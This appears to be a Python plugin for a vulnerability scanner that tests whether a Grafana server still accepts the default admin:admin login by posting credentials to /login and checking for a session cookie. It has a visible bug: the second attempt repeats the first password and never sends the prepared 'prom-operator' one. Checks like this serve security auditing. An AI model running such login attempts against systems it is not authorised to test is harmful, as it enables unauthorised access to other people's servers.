#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Grafana默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      }
  target = '/login'
  url1 = url + target
  data1 = '{"user":"admin","password":"admin"}'
  data2 = '{"user":"admin","password":"prom-operator"}'
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False)
    if res.status_code == 200 and 'message":' in res.text and '"Logged in"' in res.text and 'grafana_session' in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False)
    if res.status_code == 200 and 'message":' in res.text and '"Logged in"' in res.text and 'grafana_session' in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret